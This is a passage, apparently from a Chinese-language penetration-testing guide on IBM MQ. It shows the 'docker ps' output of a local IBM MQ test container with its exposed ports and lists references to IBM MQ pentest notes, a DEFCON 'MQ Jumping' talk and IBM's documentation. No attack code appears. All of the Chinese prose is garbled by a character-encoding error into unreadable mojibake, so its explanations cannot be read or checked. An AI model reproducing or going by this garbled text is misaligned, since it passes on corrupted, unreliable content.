åœ¨è¿™é‡Œï¼Œé˜Ÿåˆ—ç®¡ç†å™¨åç§°å·²è®¾ç½®ä¸º`MYQUEUEMGR`ï¼ˆå˜é‡`MQ_QMGR_NAME`ï¼‰ã€‚

æ‚¨åº”è¯¥å·²ç»å¯åŠ¨å¹¶æš´éœ²äº†IBM MQçš„ç«¯å£ï¼š
```bash
â¯ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> IBM MQ dockeré•œåƒçš„æ—§ç‰ˆæœ¬ä½äºï¼šhttps://hub.docker.com/r/ibmcom/mq/ã€‚

## å‚è€ƒèµ„æ–™

* [mgeekyçš„gist - "å®ç”¨çš„IBM MQæ¸—é€æµ‹è¯•ç¬”è®°"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [IBM MQæ–‡æ¡£](https://www.ibm.com/docs/en/ibm-mq)
